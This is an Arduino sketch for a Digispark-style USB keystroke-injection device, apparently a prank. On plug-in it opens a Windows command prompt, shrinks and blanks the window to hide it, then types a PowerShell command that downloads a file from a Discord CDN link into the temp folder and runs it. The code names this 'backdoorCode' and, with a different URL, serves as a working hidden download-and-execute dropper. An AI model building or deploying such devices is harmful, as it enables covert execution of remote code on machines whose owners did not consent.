// Import
#include "DigiKeyboard.h"

// This commands will be executed
const char* backdoorCode[] = {
  "set u='https://cdn.discordapp.com/attachments/1154635152610299964/1155258532598382744/rick.mp4'",   // Set url variable
  "set f=%tmp%\\rickroll.mp4",                                                                        // Set filename variable
  "powershell -c \"Invoke-WebRequest %u% -OutFile '%f%'\" && start \"\" \"%f%\" && exit"             // Download, Execute, Exit
};


// Send string and hit enter
void sendLine(const char* s, const bool newLine = true, const int delay = 100) {
  DigiKeyboard.print(s);
	DigiKeyboard.delay(50);
  if (newLine) {
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }
	DigiKeyboard.delay(delay);
}

void openHiddenCMD() {
  // Open cmd
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
	DigiKeyboard.delay(200);
  sendLine("cmd");
  // Hide & configure console window
  const char* hiddenCmd[] = {
    "mode con: cols=15 lines=1", // Resize cmd to minimal
    "color fe",                 // Change colors
    "chcp 65001",              // Set UTF8 encoding
    "title ",                 // Hide title
  };
  // Hide & configure cmd
  int hiddenCmdLength = sizeof(hiddenCmd) / sizeof(hiddenCmd[0]);
  for (int i = 0; i < hiddenCmdLength; i++) { 
      sendLine(hiddenCmd[i]);
  }
}

void runBackdoor() {
  int backdoorCodeLength = sizeof(backdoorCode) / sizeof(backdoorCode[0]);
  for (int i = 0; i < backdoorCodeLength; i++) { 
      sendLine(backdoorCode[i]);
  }
}

void setup() {
	// Init
	DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(0);
	// Open command prompt
  openHiddenCMD();
  // Do evil shit
  runBackdoor();
}

void loop() {
	DigiKeyboard.delay(1000);
}